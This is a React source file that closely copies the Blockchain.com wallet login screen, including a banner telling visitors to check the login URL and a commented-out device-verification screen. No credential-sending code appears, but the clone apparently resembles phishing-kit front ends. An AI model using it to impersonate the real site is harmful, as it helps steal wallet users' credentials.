import logo from "./logo.svg";
import "./App.scss";

function App() {
  return (
    <>
      <div className="App col-12 bg-blue text-white text-center p-1 title-url">
        Check that the URL is correct.{" "}
        <strong>https://login.blockchain.com</strong>
      </div>
      <div class="col-12 text-white text-center pt-4 fs-3 fw-bold">
        Blockchain.com
      </div>
      <div className="col-12 justify-content-around d-flex pt-4">
        <div className="col-5 bg-body border-8 shadow w-480 pb-3">
          <div className="col d-flex">
            <div className="col-6  text-center fs-4 fw-bolder tab text-color">
              Wallet
            </div>
            <div className="col-6 text-center fw-bolder bg-light border-8 tab text-lightgray">
              Exchange
            </div>
          </div>
          <form class="row g-3 has-validation" novalidate>
            <div class="col-12 p-4 pb-0">
              <div className="col-12 d-flex">
                <div className="col-6">
                  <label
                    for="inputPassword"
                    class="col-form-label fw-bold label"
                  >
                    Your Email or Wallet ID
                  </label>
                </div>
                <div class="col-6 text-end required align-self-end">
                  Required
                </div>
              </div>
              <input
                type="email"
                class="form-control is-invalid b-r-8 placeholder"
                id="floatingInput"
                placeholder="Enter email or wallet ID"
              />
              {/* hello */}
            </div>
          </form>
          <div class="col-12 p-4 ">
            <div class="d-grid gap-2">
              <button
                type="button"
                class="btn btn-primary p-12 rounded-3 b-r-8 button-btn"
              >
                Continue
              </button>
            </div>
            <div className="pt-1 text-center sub-heading pt-3">
              Need some help ?
            </div>
          </div>
          <div className="border"></div>
          <div class="col-12">
            <div className="pt-1 justify-content-center pt-3 pb-2 d-flex fw-bold">
              <div className="text-black-50">
                Don't have a Blockchain Account?
              </div>
              <div className="text-primary"> &nbsp; Sign up Now -></div>
            </div>
          </div>
        </div>
      </div>

      {/* <div className="App col-12 bg-blue text-white text-center p-1 title-url">
        Check that the URL is correct. <strong>https://login.blockcFhain.com</strong>
      </div>
      <div class="col-12 text-white text-center pt-4 fs-3 fw-bold">
    Blockchain.com
      </div>
      <div className="col-12 justify-content-around d-flex pt-4">
        <div className="col-5 bg-body border-8 shadow w-480 pb-3">
          <div className="col d-flex p-3">
            back
          </div>
          <div className="col-12">
            <div className="col-8">
           If you have an account registered with this email address. you will recieve an email with a link to verify your device
            </div>
          </div>
          <div class="col-12 p-4 ">
            <div class="d-grid gap-2">
              <button type="button" class="btn p-12 rounded-3 b-r-8 button-btn bg-white text-primary">
                Send Again
              </button>
            </div>
            <div className="pt-1 text-center sub-heading pt-3">Need some help ?</div>
          </div>
          <div className="border"></div>
          <div class="col-12">
            <div className="pt-1 justify-content-center pt-3 pb-2 d-flex fw-bold">
              <div className="text-black-50">
                Don't have a Blockchain Account?
              </div>
              <div className="text-primary"> &nbsp; Sign up Now -></div>
            </div>
          </div>
        </div>
      </div> */}
    </>
  );
}

export default App;
